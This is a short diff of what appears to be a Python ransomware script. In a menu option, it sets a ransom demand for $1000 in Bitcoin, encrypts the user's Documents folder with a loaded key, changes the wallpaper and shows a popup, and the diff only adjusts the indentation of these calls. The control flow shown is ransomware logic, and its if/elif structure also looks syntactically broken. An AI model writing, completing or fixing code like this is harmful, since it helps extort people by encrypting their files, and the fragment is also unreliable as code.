@@ -87,11 +87,11 @@ while True:
     elif method_choice == "7":
         message = "Your files have been encrypted. Pay $1000 in Bitcoin to get the decryption key."
     key = load_key()
-    encrypt_folder("C:\\Users\\<username>\\Documents\\", key)
-    change_wallpaper(message)
-    show_popup(message)
+        encrypt_folder("C:\\Users\\<username>\\Documents\\", key)
+        change_wallpaper(message)
+        show_popup(message)
     elif method_choice == "8":
-    break
+        break
 
 else:
     print("Choose is invalid. Please try again.")
